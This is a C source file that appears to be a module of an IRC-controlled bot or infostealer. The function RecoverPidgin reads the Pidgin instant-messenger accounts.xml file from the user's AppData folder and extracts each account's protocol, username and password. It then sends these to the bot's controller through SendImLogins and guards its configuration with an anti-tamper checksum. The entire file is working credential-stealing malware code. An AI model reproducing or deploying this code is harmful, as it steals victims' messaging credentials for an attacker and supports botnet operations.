#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_RECOVERY
void RecoverPidgin()
{
    char cPath[DEFAULT];
    sprintf(cPath, "%s\\.purple\\accounts.xml", cAppData);

    if(!FileExists(cPath))
        return;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s%s%i%s%s%s%s%s", cVersion, cServer,
            usPort, cChannel, cChannelKey,
            cAuthHost, cOwner, cServerPass);
    char *cStr = cCheckString;
    unsigned long ulCheck = 4981+(400*1);
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum1)
    {
        strcpy(cChannel, cChannelKey);
        return;
    }
    // <!-------! CRC AREA STOP !-------!>

    char cAccountBefore[10];
    strcpy(cAccountBefore, "<account>");

    char cClientBefore[11];
    strcpy(cClientBefore, "<protocol>");

    char cUserBefore[7];
    strcpy(cUserBefore, "<name>");

    char cPassBefore[11];
    strcpy(cPassBefore, "<password>");

    char cClient[DEFAULT];
    char cUser[DEFAULT];
    char cPass[DEFAULT];

    char *pcFileContents = GetContentsFromFile(cPath);
    char *pcBlockStart = strstr(pcFileContents, cAccountBefore) + strlen(cAccountBefore);

    while(strstr(pcBlockStart, cAccountBefore))
    {
        char cBreakString[strlen(pcBlockStart)];

        char *pcProcessContents = strstr(pcBlockStart, cClientBefore) + strlen(cClientBefore);
        strcpy(cBreakString, pcProcessContents);
        char *pcBreakPiece = strtok(cBreakString, "<") + 5;
        strcpy(cClient, pcBreakPiece);

        pcProcessContents = strstr(pcBlockStart, cUserBefore) + strlen(cUserBefore);
        strcpy(cBreakString, pcProcessContents);
        pcBreakPiece = strtok(cBreakString, "<");
        strcpy(cUser, pcBreakPiece);

        pcProcessContents = strstr(pcBlockStart, cPassBefore) + strlen(cPassBefore);
        strcpy(cBreakString, pcProcessContents);
        pcBreakPiece = strtok(cBreakString, "<");
        strcpy(cPass, pcBreakPiece);

        SendImLogins(cClient, cUser, cPass);
        Sleep(IRC_SND_DELAY);

        pcBlockStart = strstr(pcBlockStart, cAccountBefore) + strlen(cAccountBefore);
    }
}

DWORD WINAPI RecoverIm(LPVOID)
{
    RecoverPidgin();
    return 1;
}
#endif
#endif
